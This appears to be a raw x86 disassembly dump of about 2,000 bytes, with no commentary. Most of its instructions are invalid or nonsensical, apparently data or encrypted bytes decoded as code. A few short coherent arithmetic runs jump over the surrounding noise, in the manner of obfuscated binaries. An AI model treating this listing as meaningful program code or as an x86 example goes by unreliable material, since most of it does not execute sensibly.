  40c7e7:	xor    bl,ch
  40c7e9:	adc    eax,0xb9f6c910
  40c7ee:	(bad)  
  40c7ef:	or     dl,BYTE PTR [edx+0x3fcce5b1]
  40c7f5:	mov    bh,ch
  40c7f7:	cmp    DWORD PTR [ebp+0x35f3f51f],esp
  40c7fd:	les    ecx,FWORD PTR [ecx-0xa433246]
  40c803:	dec    ebp
  40c804:	push   0x60
  40c806:	jecxz  0x40c79b
  40c808:	mov    al,ds:0xac72db8b
  40c80d:	jo     0x40c88a
  40c80f:	(bad)  
  40c810:	or     bl,BYTE PTR [ebx-0x16]
  40c813:	pushf  
  40c814:	idiv   DWORD PTR [esp+ebx*2-0x51adb35a]
  40c81b:	sub    eax,0xc200689c
  40c820:	les    esp,FWORD PTR [ecx]
  40c822:	sub    al,0x89
  40c824:	pop    edi
  40c825:	call   0x66ed:0x28a4c5ee
  40c82c:	js     0x40c84d
  40c82e:	add    eax,0xaa821598
  40c833:	int3   
  40c834:	cmp    esi,edi
  40c836:	ins    BYTE PTR es:[edi],dx
  40c837:	stc    
  40c838:	mov    al,0x70
  40c83a:	or     ah,BYTE PTR [edi+0x29]
  40c83d:	addr16 push ebx
  40c83f:	sub    dl,ah
  40c841:	fnsave [edx-0x471230ef]
  40c847:	call   DWORD PTR [ecx]
  40c849:	cwde   
  40c84a:	fst    DWORD PTR [esi+ebp*2+0x6c8835fc]
  40c851:	sub    al,0x5d
  40c853:	inc    edx
  40c854:	sub    DWORD PTR [ebx+0x3e],0xffffff90
  40c858:	pop    esp
  40c859:	jnp    0x40c7f1
  40c85b:	out    0xb,eax
  40c85d:	stos   DWORD PTR es:[edi],eax
  40c85e:	jmp    0x44f4a148
  40c863:	icebp  
  40c864:	dec    eax
  40c865:	stc    
  40c866:	push   ax
  40c868:	mov    dl,0x50
  40c86a:	mov    ds:0x2fa3cd49,al
  40c86f:	std    
  40c870:	dec    ecx
  40c871:	xchg   esi,eax
  40c872:	in     eax,0xbe
  40c874:	shr    bh,cl
  40c876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c877:	mov    esi,0xea53e371
  40c87c:	pop    ds
  40c87d:	inc    edx
  40c87e:	js     0x40c84b
  40c880:	das    
  40c881:	bound  ebp,QWORD PTR ds:0x43d3b130
  40c887:	xor    al,0xf3
  40c889:	ins    DWORD PTR es:[edi],dx
  40c88a:	xchg   ebp,eax
  40c88b:	jbe    0x40c812
  40c88d:	das    
  40c88e:	cmp    BYTE PTR [edi+0x78],bh
  40c891:	dec    ecx
  40c892:	call   0x661a:0x15bf3bd1
  40c899:	and    ch,al
  40c89b:	pop    ebx
  40c89c:	enter  0x8349,0x53
  40c8a0:	repz push esp
  40c8a2:	xchg   edi,eax
  40c8a3:	xchg   ebp,eax
  40c8a4:	ins    BYTE PTR es:[edi],dx
  40c8a5:	mov    ds:0x79b35e6f,al
  40c8aa:	shl    DWORD PTR [ecx],cl
  40c8ac:	xchg   edi,eax
  40c8ad:	inc    esp
  40c8ae:	sti    
  40c8af:	aaa    
  40c8b0:	push   esp
  40c8b1:	ret    0xadf
  40c8b4:	xlat   BYTE PTR ds:[ebx]
  40c8b5:	fwait
  40c8b6:	and    al,0xdf
  40c8b8:	jnp    0x40c8a1
  40c8ba:	in     al,0x7a
  40c8bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8bd:	jmp    0xd56d:0xe5a284c9
  40c8c4:	sub    eax,0xe27a1e47
  40c8c9:	jmp    0xa81:0x278829c0
  40c8d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8d1:	xchg   esp,eax
  40c8d2:	sbb    ebx,DWORD PTR [ebx-0x528affee]
  40c8d8:	pop    ebp
  40c8d9:	aam    0xd5
  40c8db:	push   ebx
  40c8dc:	arpl   WORD PTR [esi+0x7f],bp
  40c8df:	loop   0x40c917
  40c8e1:	popa   
  40c8e2:	push   0xaeb92f74
  40c8e7:	lea    edi,fs:[edi-0x74677536]
  40c8ee:	jge    0x40c8d8
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	push   cs
  40c919:	out    0x1a,al
  40c91b:	jge    0x40c909
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c933
  40c925:	xchg   esi,eax
  40c926:	add    ch,0x70
  40c929:	outs   dx,BYTE PTR ds:[esi]
  40c92a:	jmp    0x40c994
  40c92c:	cmp    DWORD PTR [ecx+0x3ab64d35],edi
  40c932:	mov    ds,edx
  40c934:	xchg   BYTE PTR [ecx],cl
  40c936:	xchg   ecx,eax
  40c937:	cmp    DWORD PTR [ebx-0x18],ebp
  40c93a:	lods   eax,DWORD PTR ds:[esi]
  40c93b:	inc    ecx
  40c93c:	out    dx,eax
  40c93d:	fdiv   DWORD PTR [esi-0x58cb5723]
  40c943:	inc    eax
  40c944:	xchg   edi,eax
  40c945:	dec    edi
  40c946:	imul   edi,eax,0xffffffe5
  40c949:	sar    BYTE PTR [ebp-0x4f6d09fe],1
  40c94f:	pop    edi
  40c950:	outs   dx,BYTE PTR ds:[esi]
  40c951:	loopne 0x40c9b2
  40c953:	pop    edi
  40c954:	jae    0x40c917
  40c956:	sar    BYTE PTR [esi-0x5e],0xb6
  40c95a:	out    0x8c,eax
  40c95c:	add    DWORD PTR [ebx],eax
  40c95e:	or     BYTE PTR ds:0x7c9ef417,cl
  40c964:	jbe    0x40c97d
  40c966:	mov    ch,0xf3
  40c968:	push   0xb92e689a
  40c96d:	pop    ecx
  40c96e:	repz add al,0x6b
  40c971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c972:	push   eax
  40c973:	cli    
  40c974:	clc    
  40c975:	scas   al,BYTE PTR es:[edi]
  40c976:	inc    edx
  40c977:	bound  edx,QWORD PTR [edi-0x3f]
  40c97a:	int3   
  40c97b:	in     eax,dx
  40c97c:	adc    al,BYTE PTR [ebp-0x447d1912]
  40c982:	out    dx,eax
  40c983:	aas    
  40c984:	mov    cs,WORD PTR [eax]
  40c986:	lods   al,BYTE PTR ds:[esi]
  40c987:	int3   
  40c988:	(bad)  
  40c989:	popa   
  40c98a:	mov    bh,0x57
  40c98c:	adc    BYTE PTR [ecx+ebp*8-0x1fed1cc7],bl
  40c993:	ins    BYTE PTR es:[edi],dx
  40c994:	push   ss
  40c995:	and    ch,BYTE PTR [edi+0x6627226d]
  40c99b:	ret    
  40c99c:	bound  ebx,QWORD PTR [edi*8+0x7c504a17]
  40c9a3:	jnp    0x40c963
  40c9a5:	mov    ds:0x2404f15e,al
  40c9aa:	jl     0x40c9a8
  40c9ac:	(bad)  
  40c9ad:	push   ebx
  40c9ae:	int    0x5a
  40c9b0:	or     BYTE PTR [ecx-0x56],bh
  40c9b3:	mov    ds:0xf870cfb7,eax
  40c9b8:	dec    esi
  40c9b9:	pop    eax
  40c9ba:	inc    ebx
  40c9bb:	mov    esi,0x3b089893
  40c9c0:	push   eax
  40c9c1:	(bad)  
  40c9c3:	mov    dh,0x49
  40c9c5:	push   esi
  40c9c6:	dec    ebp
  40c9c7:	call   0xa8331eb0
  40c9cc:	pop    esp
  40c9cd:	dec    esp
  40c9ce:	mov    ch,0x2c
  40c9d0:	cmp    BYTE PTR [ecx],ah
  40c9d2:	call   0x9dc9:0x97b89ed0
  40c9d9:	pop    ebx
  40c9da:	into   
  40c9db:	add    bl,dh
  40c9dd:	dec    ecx
  40c9de:	pop    ebp
  40c9df:	dec    eax
  40c9e0:	shr    BYTE PTR [edi-0x17],0x54
  40c9e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9e5:	cmp    cl,BYTE PTR [ebx+0x7]
  40c9e8:	js     0x40ca33
  40c9ea:	push   0xb
  40c9ec:	dec    edi
  40c9ed:	add    edi,eax
  40c9ef:	test   eax,0x261464a1
  40c9f4:	imul   edi,DWORD PTR ds:0x4b0d620b,0x94335baa
  40c9fe:	sbb    al,0x13
  40ca00:	mov    al,0xd9
  40ca02:	push   es
  40ca03:	scas   al,BYTE PTR es:[edi]
  40ca04:	fsubr  QWORD PTR [edi]
  40ca06:	test   ah,bh
  40ca08:	cmp    edx,edx
  40ca0a:	push   cs
  40ca0b:	sbb    eax,0x36436bf5
  40ca10:	jbe    0x40ca14
  40ca12:	jmp    0x40c9a5
  40ca14:	mov    dh,0x28
  40ca16:	jge    0x40c9b3
  40ca18:	ja     0x40ca12
  40ca1a:	(bad)  
  40ca1b:	aam    0x61
  40ca1d:	mov    dl,0xd6
  40ca1f:	jmp    0x1fc53ce2
  40ca24:	jle    0x40ca1e
  40ca26:	dec    eax
  40ca27:	popa   
  40ca28:	jae    0x40ca36
  40ca2a:	mov    ecx,0x61bd888f
  40ca2f:	sbb    ebp,0xffffffc6
  40ca32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca33:	in     al,dx
  40ca34:	jg     0x40ca1b
  40ca36:	and    BYTE PTR ds:0xcdaec9c,dh
  40ca3c:	mov    edi,0x5cab00dd
  40ca41:	loopne 0x40ca8d
  40ca43:	cs jp  0x40ca2e
  40ca46:	and    eax,0xaca40407
  40ca4b:	jns    0x40ca0f
  40ca4d:	dec    ebp
  40ca4e:	(bad)
  40ca52:	sub    al,0xfb
  40ca54:	repz imul ecx,DWORD PTR [eax+0x323b130a],0x5
  40ca5c:	dec    ebp
  40ca5d:	inc    esi
  40ca5e:	jae    0x40ca9c
  40ca60:	xor    dl,bh
  40ca62:	repnz push esi
  40ca64:	push   0xffffffbe
  40ca66:	pushf  
  40ca67:	mov    ah,0x2
  40ca69:	les    ebx,FWORD PTR [eax]
  40ca6b:	arpl   WORD PTR [edi+0x14913c88],bp
  40ca71:	das    
  40ca72:	mov    ds:0xf205e49d,eax
  40ca77:	mov    cl,0xb0
  40ca79:	cmp    eax,0xcea50bbd
  40ca7e:	jnp    0x40ca09
  40ca80:	aam    0x20
  40ca82:	call   0x8092:0xdd28c514
  40ca89:	(bad)  
  40ca8a:	push   esp
  40ca8b:	jns    0x40ca69
  40ca8d:	fisttp WORD PTR [ecx+ecx*2-0x57c0612a]
  40ca94:	cmc    
  40ca95:	stos   BYTE PTR es:[edi],al
  40ca96:	in     al,dx
  40ca97:	in     eax,0x73
  40ca99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca9a:	je     0x40caca
  40ca9c:	and    edi,eax
  40ca9e:	loope  0x40ca60
  40caa0:	aaa    
  40caa1:	shl    BYTE PTR [edi+0x2f],cl
  40caa4:	sub    eax,0x2b8d7926
  40caa9:	jmp    0x7ca7:0xd5a23d13
  40cab0:	adc    DWORD PTR [edx],0xffffffb3
  40cab3:	(bad)  
  40cab4:	and    al,0x9c
  40cab6:	push   0x7f2bcfc
  40cabb:	mov    bh,0x83
  40cabd:	mov    ch,0xee
  40cabf:	sbb    dl,bl
  40cac1:	jg     0x40ca46
  40cac3:	or     BYTE PTR [esi-0x59],ch
  40cac6:	(bad)  
  40cac8:	jmp    0xcb5e:0xeab7312d
  40cacf:	inc    eax
  40cad0:	rcl    DWORD PTR [eax-0x78],cl
  40cad3:	inc    edi
  40cad4:	sbb    al,0x9
  40cad6:	fisttp WORD PTR [ecx-0x35]
  40cad9:	mov    edx,0x7e41b9
  40cade:	jb     0x40caff
  40cae0:	leave  
  40cae1:	loop   0x40cad7
  40cae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cae4:	test   DWORD PTR [ecx],ebp
  40cae6:	call   0xb5a7:0x70db5504
  40caed:	test   al,0x6e
  40caef:	xor    DWORD PTR [esi-0x32],ecx
  40caf2:	std    
  40caf3:	mov    BYTE PTR [ebx+0x6d3a4e36],al
  40caf9:	xchg   ebp,eax
  40cafa:	push   ecx
  40cafb:	jnp    0x40cb5d
  40cafd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cafe:	pusha  
  40caff:	jg     0x40cacb
  40cb01:	bound  ebp,QWORD PTR [esi+0x13]
  40cb04:	cwde   
  40cb05:	int3   
  40cb06:	mov    dh,0x5b
  40cb08:	lahf   
  40cb09:	es xchg ebp,eax
  40cb0b:	not    BYTE PTR [edi+0x5c]
  40cb0e:	sub    al,0x4c
  40cb10:	sti    
  40cb11:	push   eax
  40cb12:	mov    esp,DWORD PTR ds:[edi]
  40cb15:	mov    BYTE PTR [eax+esi*1+0x26],dl
  40cb19:	add    eax,0x6a0286ea
  40cb1e:	cld    
  40cb1f:	and    edi,eax
  40cb21:	(bad)
  40cb25:	cmp    eax,0x4d97e283
  40cb2a:	push   ds
  40cb2b:	xlat   BYTE PTR ds:[ebx]
  40cb2c:	and    al,0x80
  40cb2e:	dec    ebp
  40cb2f:	cdq    
  40cb30:	inc    ebp
  40cb31:	lock pop ecx
  40cb33:	frstpm(287 only) 
  40cb35:	(bad)  
  40cb36:	cld    
  40cb37:	stos   BYTE PTR es:[edi],al
  40cb38:	shl    DWORD PTR [ebx+0x7efcffea],cl
  40cb3e:	aas    
  40cb3f:	push   es
  40cb40:	aas    
  40cb41:	sbb    al,0x6a
  40cb43:	adc    BYTE PTR [esi-0x52c007b2],bh
  40cb49:	int    0x39
  40cb4b:	cmp    DWORD PTR [esi],0x47
  40cb4e:	test   eax,0x9b58f0e2
  40cb53:	push   edi
  40cb54:	pop    ss
  40cb55:	out    0xf7,al
  40cb57:	outs   dx,BYTE PTR ds:[esi]
  40cb58:	mov    fs,WORD PTR [edi+0x34b0dcb0]
  40cb5e:	sar    BYTE PTR ds:0x7171138e,1
  40cb64:	add    al,0x8b
  40cb66:	sbb    DWORD PTR [bx+di],ecx
  40cb69:	mov    al,ds:0x6c404ab7
  40cb6e:	adc    al,0xf4
  40cb70:	enter  0x78b,0x35
  40cb74:	aam    0x45
  40cb76:	or     BYTE PTR [ecx-0x2e79d709],0xa4
  40cb7d:	pop    DWORD PTR [ecx+eiz*1-0x709b288]
  40cb84:	hlt    
  40cb85:	xor    ah,dl
  40cb87:	in     al,0x7e
  40cb89:	retf   0x5839
  40cb8c:	pop    eax
  40cb8d:	xor    eax,DWORD PTR [esi+0x38]
  40cb90:	jo     0x40cbb6
  40cb92:	fs jb  0x40cba4
  40cb95:	adc    ah,BYTE PTR [edx]
  40cb97:	lock retf 0x7558
  40cb9b:	sub    eax,0x65f7d94e
  40cba0:	call   0xeeee:0x37e9942a
  40cba7:	int    0x10
  40cba9:	rcr    esi,1
  40cbab:	dec    ecx
  40cbac:	push   esp
  40cbad:	mov    esi,0x94252a9a
  40cbb2:	mov    WORD PTR [ecx+0x52209677],cs
  40cbb8:	rcl    dh,1
  40cbba:	jo     0x40cb6c
  40cbbc:	jecxz  0x40cbef
  40cbbe:	(bad)  
  40cbbf:	push   edi
  40cbc0:	push   cs
  40cbc1:	repz es inc ecx
  40cbc4:	inc    ebx
  40cbc5:	cmp    eax,0x89fa1d21
  40cbca:	jg     0x40cc08
  40cbcc:	dec    esi
  40cbcd:	lahf   
  40cbce:	pop    ecx
  40cbcf:	in     eax,0x8b
  40cbd1:	hlt    
  40cbd2:	out    0x3d,al
  40cbd4:	inc    esi
  40cbd5:	mov    ecx,cs
  40cbd7:	mov    ebx,esi
  40cbd9:	xor    DWORD PTR [ecx+0x2c2b242d],ecx
  40cbdf:	push   0xd74c0247
  40cbe4:	sbb    al,0xfd
  40cbe6:	dec    ecx
  40cbe7:	jle    0x40cc0f
  40cbe9:	or     eax,0xa6bbb5c1
  40cbee:	adc    al,0x4c
  40cbf0:	int3   
  40cbf1:	aad    0x3f
  40cbf3:	cld    
  40cbf4:	or     bl,BYTE PTR [edx+eax*8-0x56c6a161]
  40cbfb:	test   eax,ebp
  40cbfd:	mov    ah,0xde
  40cbff:	mov    WORD PTR ds:0x144d9d2a,ss
  40cc05:	pusha  
  40cc06:	adc    eax,DWORD PTR [eax]
  40cc08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc09:	test   BYTE PTR ds:0xc8f6a6ad,bl
  40cc0f:	retf   
  40cc10:	inc    eax
  40cc11:	inc    ecx
  40cc12:	xchg   ebx,eax
  40cc13:	loop   0x40cc0e
  40cc15:	fsubp  st(7),st
  40cc17:	js     0x40cc83
  40cc19:	sbb    BYTE PTR [eax+0x67],0x35
  40cc1d:	cdq    
  40cc1e:	push   0x44
  40cc20:	pop    ss
  40cc21:	add    al,0xb4
  40cc23:	cs popa 
  40cc25:	jp     0x40cbf6
  40cc27:	pop    ebp
  40cc28:	jge    0x40cc2d
  40cc2a:	mov    dh,0xb1
  40cc2c:	mov    ecx,0xc7d30ce4
  40cc31:	int    0xd2
  40cc33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc34:	xor    bh,BYTE PTR [ebp+0x14b62835]
  40cc3a:	mov    ebp,0xb1727080
  40cc3f:	sub    al,0xbf
  40cc41:	icebp  
  40cc42:	lods   eax,DWORD PTR ds:[esi]
  40cc43:	out    dx,eax
  40cc44:	scas   al,BYTE PTR es:[edi]
  40cc45:	lock es pop es
  40cc48:	mov    ds:0xe81fd981,eax
  40cc4d:	das    
  40cc4e:	lahf   
  40cc4f:	jns    0x40cc52
  40cc51:	xchg   edi,eax
  40cc52:	retf   0xda86
  40cc55:	pop    edi
  40cc56:	add    BYTE PTR [ebp+ebx*4-0xa],cl
  40cc5a:	jbe    0x40cc35
  40cc5c:	int    0xd0
  40cc5e:	bts    DWORD PTR ss:[ecx+0xd661387],edi
  40cc66:	adc    eax,0xcecad3e4
  40cc6b:	or     eax,0x69cdfbda
  40cc70:	push   ds
  40cc71:	cmp    eax,0x4c119aea
  40cc76:	(bad)  
  40cc77:	shl    BYTE PTR [ebx+0x4580cdf5],cl
  40cc7d:	inc    eax
  40cc7e:	mov    WORD PTR [edx-0x26],fs
  40cc81:	cs repz mov ebx,0xd71eb396
  40cc88:	and    ecx,esi
  40cc8a:	fdiv   st(2),st
  40cc8c:	sahf   
  40cc8d:	cmp    dh,BYTE PTR [edx]
  40cc8f:	xor    al,0xe2
  40cc91:	mov    bh,0x4b
  40cc93:	xchg   edi,eax
  40cc94:	repz cmp al,0xf4
  40cc97:	add    bh,cl
  40cc99:	mov    dl,0xcc
  40cc9b:	nop
  40cc9c:	(bad)  
  40cc9d:	call   0xe78fa35a
  40cca2:	les    ecx,FWORD PTR [ebx-0x55]
  40cca5:	(bad)  
  40cca6:	push   esp
  40cca7:	inc    edi
  40cca9:	sti    
  40ccaa:	mov    BYTE PTR [ebp+0x5],dh
  40ccad:	cmp    esi,DWORD PTR [eax-0x44cf8ef6]
  40ccb3:	pop    ss
  40ccb4:	aad    0xbe
  40ccb6:	loop   0x40cd27
  40ccb8:	push   ss
  40ccb9:	clc    
  40ccba:	(bad)  
  40ccbb:	call   0x81cc:0x461daf22
  40ccc2:	je     0x40cccc
  40ccc4:	iret   
  40ccc5:	xor    edi,eax
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	sbb    DWORD PTR [eax+0xb8aacff],0xffffff90
  40cd1c:	jo     0x40cd8e
  40cd1e:	lahf   
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40cd63
  40cd23:	jmp    0xfd3f5db8
  40cd28:	or     BYTE PTR [eax-0x2fc9301c],0x22
  40cd2f:	lods   al,BYTE PTR ds:[esi]
  40cd30:	add    BYTE PTR [ecx+0x6c],0xf4
  40cd34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd35:	scas   al,BYTE PTR es:[edi]
  40cd36:	(bad)  
  40cd37:	imul   ebx,DWORD PTR [ecx+0x7a],0x6e5b1c8e
  40cd3e:	cmp    eax,0x55000ac7
  40cd43:	sub    eax,0x8190d3a8
  40cd48:	lods   eax,DWORD PTR ds:[esi]
  40cd49:	repnz or DWORD PTR [esi+0x3b],esp
  40cd4d:	push   es
  40cd4e:	pop    esp
  40cd4f:	jo     0x40cd6f
  40cd51:	jecxz  0x40cd72
  40cd53:	fidivr WORD PTR [ecx+0x65]
  40cd56:	mov    edx,0xec62fedf
  40cd5b:	cdq    
  40cd5c:	lods   eax,DWORD PTR ds:[esi]
  40cd5d:	dec    ebp
  40cd5e:	fnstenv [ebx-0x344b017b]
  40cd64:	sbb    al,0x42
  40cd66:	sub    al,0xb9
  40cd68:	adc    al,0x15
  40cd6a:	xchg   edi,eax
  40cd6b:	dec    edi
  40cd6c:	pop    esp
  40cd6d:	bound  esp,QWORD PTR [edi-0x7c]
  40cd70:	xchg   esi,eax
  40cd71:	les    ebx,FWORD PTR [ebx+0x5f]
  40cd74:	and    BYTE PTR [esi-0x7472f06f],bl
  40cd7a:	fist   DWORD PTR [ecx-0x68]
  40cd7d:	cmp    BYTE PTR [ebp+ecx*8+0x4d],ch
  40cd81:	stc    
  40cd82:	(bad)  
  40cd83:	cld    
  40cd84:	call   0x3b0a:0x4a1f5922
  40cd8b:	xchg   ebx,eax
  40cd8c:	jl     0x40cd82
  40cd8e:	mov    WORD PTR [ebx],es
  40cd90:	push   es
  40cd91:	call   0x3830:0xffe64f8f
  40cd98:	pushf  
  40cd99:	aad    0x8a
  40cd9b:	stos   BYTE PTR es:[edi],al
  40cd9c:	pop    es
  40cd9d:	or     bh,BYTE PTR [eax+0x38]
  40cda0:	(bad)  
  40cda1:	push   ds
  40cda2:	jg     0x40ce21
  40cda4:	sbb    esi,edi
  40cda6:	in     eax,dx
  40cda7:	xchg   edx,eax
  40cda8:	imul   ecx,DWORD PTR [esi+esi*1-0x46],0x2a
  40cdad:	stc    
  40cdae:	jecxz  0x40cd71
  40cdb0:	arpl   WORD PTR ss:[ebx+0x52],si
  40cdb4:	(bad)  
  40cdb5:	ficomp WORD PTR [ebx-0x29]
  40cdb8:	mov    ch,0x5b
  40cdba:	push   esp
  40cdbb:	add    eax,0xb75bf89d
  40cdc0:	ins    DWORD PTR es:[edi],dx
  40cdc1:	jmp    0x54bc:0x9da2484
  40cdc8:	(bad)  
  40cdc9:	popf   
  40cdca:	or     eax,0x7eb98b9c
  40cdcf:	cmp    dl,BYTE PTR [edi-0x80]
  40cdd2:	mul    DWORD PTR [ecx+0x4c]
  40cdd5:	mov    ebp,es
  40cdd7:	ret    
  40cdd8:	mov    eax,0xc487a1f1
  40cddd:	sahf   
  40cdde:	jb     0x40ce0b
  40cde0:	cmp    eax,0x2b0cc5d6
  40cde5:	cmp    dh,BYTE PTR [edx]
  40cde7:	daa    
  40cde8:	ret    0x357c
  40cdeb:	mov    BYTE PTR [edx+ebx*8+0x55],al
  40cdef:	outs   dx,DWORD PTR ds:[esi]
  40cdf0:	mov    bh,0x84
  40cdf2:	stos   BYTE PTR es:[edi],al
  40cdf3:	shl    DWORD PTR [edi],1
  40cdf5:	out    0xb,al
  40cdf7:	and    eax,0x50e87018
  40cdfc:	jl     0x40ce00
  40cdfe:	iret   
  40cdff:	sub    al,0x39
  40ce01:	mov    WORD PTR [ebx+0x3b],cs
  40ce04:	fwait
  40ce05:	adc    BYTE PTR [ebx+0xe],0xaa
  40ce09:	lods   al,BYTE PTR ds:[esi]
  40ce0a:	enter  0x52a6,0xb7
  40ce0e:	enter  0xe873,0xb5
  40ce12:	pop    edx
  40ce13:	pop    ebx
  40ce14:	push   0x372294e9
  40ce19:	add    BYTE PTR [edx+0x49],ah
  40ce1c:	fwait
  40ce1d:	imul   DWORD PTR cs:[ecx-0x2a]
  40ce21:	daa    
  40ce22:	adc    al,BYTE PTR [ebx+0x44]
  40ce25:	xchg   edx,eax
  40ce26:	and    al,0xb4
  40ce28:	lods   al,BYTE PTR ds:[esi]
  40ce29:	add    BYTE PTR [ebx+0x7e9034d5],bh
  40ce2f:	and    eax,0x63eea16c
  40ce34:	pusha  
  40ce35:	mov    bl,0xea
  40ce37:	add    BYTE PTR [esi+0xc],0x75
  40ce3b:	fld    TBYTE PTR [esp+esi*4+0x73395ee9]
  40ce42:	imul   eax,DWORD PTR [ecx],0xffffffc7
  40ce45:	bound  edi,QWORD PTR [ebx-0x58095990]
  40ce4b:	add    DWORD PTR [edx+esi*1-0x76],ebx
  40ce4f:	addr16 jmp 0x98bf:0xf1739de1
  40ce57:	clc    
  40ce58:	in     al,dx
  40ce59:	jnp    0x40ce97
  40ce5b:	mov    eax,0xaef2e235
  40ce60:	out    dx,al
  40ce61:	scas   eax,DWORD PTR es:[edi]
  40ce62:	pop    ebp
  40ce63:	mov    ecx,0x52a81e9b
  40ce68:	jl     0x40cea9
  40ce6a:	aam    0xb0
  40ce6c:	or     ch,dh
  40ce6e:	cmp    al,al
  40ce70:	data16 sub bl,BYTE PTR [eax+0x68]
  40ce74:	inc    ebp
  40ce75:	adc    BYTE PTR [eax+eax*2+0x17],dl
  40ce79:	jp     0x40ce43
  40ce7b:	repnz sar BYTE PTR [ecx-0x43991cdb],0xf1
  40ce83:	mov    eax,0x2503861a
  40ce88:	push   esi
  40ce89:	gs sub eax,0x372e146e
  40ce8f:	xlat   BYTE PTR ds:[ebx]
  40ce90:	sahf   
  40ce91:	mov    ds:0xd75cec4,al
  40ce96:	xor    edx,ecx
  40ce98:	addr16 dec edi
  40ce9a:	pushf  
  40ce9b:	cwde   
  40ce9c:	ja     0x40ce47
  40ce9e:	pop    eax
  40ce9f:	pop    eax
  40cea0:	jnp    0x40ce85
  40cea2:	or     dh,BYTE PTR [ebp+0x72706c9]
  40cea8:	jg     0x40cf23
  40ceaa:	pop    es
  40ceab:	lock ins BYTE PTR es:[edi],dx
  40cead:	(bad)  
  40ceae:	sbb    esp,edx
  40ceb0:	sbb    bh,BYTE PTR [edx-0x2ddc3eaf]
  40ceb6:	popa   
  40ceb7:	iret   
  40ceb8:	fbld   TBYTE PTR [ebp+0x4b]
  40cebb:	daa    
  40cebc:	fstp   TBYTE PTR [ebx]
  40cebe:	int3   
  40cebf:	sub    ecx,DWORD PTR [eax-0x64]
  40cec2:	adc    DWORD PTR [ecx+0x6482ed0],edi
  40cec8:	gs mov ch,0x3e
  40cecb:	xchg   esi,eax
  40cecc:	xchg   edx,eax
  40cecd:	xor    cl,dl
  40cecf:	pop    ds
  40ced0:	or     al,0x41
  40ced2:	and    BYTE PTR [ebx],cl
  40ced4:	push   ebx
  40ced5:	inc    edx
  40ced6:	mov    ebp,0xb9bd3d1c
  40cedb:	std    
  40cedc:	shr    ebp,1
  40cede:	xor    eax,0x1fd289e4
  40cee3:	push   ds
  40cee4:	stos   DWORD PTR es:[edi],eax
  40cee5:	push   es
  40cee6:	dec    ebp
  40cee7:	pop    edi
  40cee8:	inc    ebp
  40cee9:	sbb    al,cl
  40ceeb:	mov    dh,0x56
  40ceed:	leave  
  40ceee:	mov    al,0x82
  40cef0:	cmp    DWORD PTR [edi-0x3c],ebp
  40cef3:	or     BYTE PTR [ebp+0x4ac232ff],dl
  40cef9:	outs   dx,DWORD PTR ds:[esi]
  40cefa:	cmp    ebx,DWORD PTR [edi+0x29]
  40cefd:	fsubr  QWORD PTR [ebp-0x61]
  40cf00:	mov    bh,0x7d
  40cf02:	add    bl,bl
  40cf04:	icebp  
  40cf05:	cli    
  40cf06:	pop    ecx
  40cf07:	sbb    BYTE PTR [edi],ah
  40cf09:	fmul   QWORD PTR [esp+esi*2]
  40cf0c:	std    
  40cf0d:	imul   ecx,DWORD PTR [ebp-0x2a],0x1
  40cf11:	vandps ymm6,ymm2,YMMWORD PTR [esi-0x5f]
  40cf17:	sti    
  40cf18:	xor    DWORD PTR [edx+0xd],esp
  40cf1b:	push   cs
  40cf1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf1d:	cmp    DWORD PTR [edx-0x7405070c],ebx
  40cf23:	sub    al,0xa2
  40cf25:	outs   dx,BYTE PTR ds:[esi]
  40cf26:	call   0x853366a7
  40cf2b:	jns    0x40cf7f
  40cf2d:	pop    esi
  40cf2e:	mov    BYTE PTR [esi+0x60e8c9f2],cl
  40cf34:	push   es
  40cf35:	push   ebp
  40cf36:	fsubr  DWORD PTR [edx]
  40cf38:	mov    eax,0xd351d505
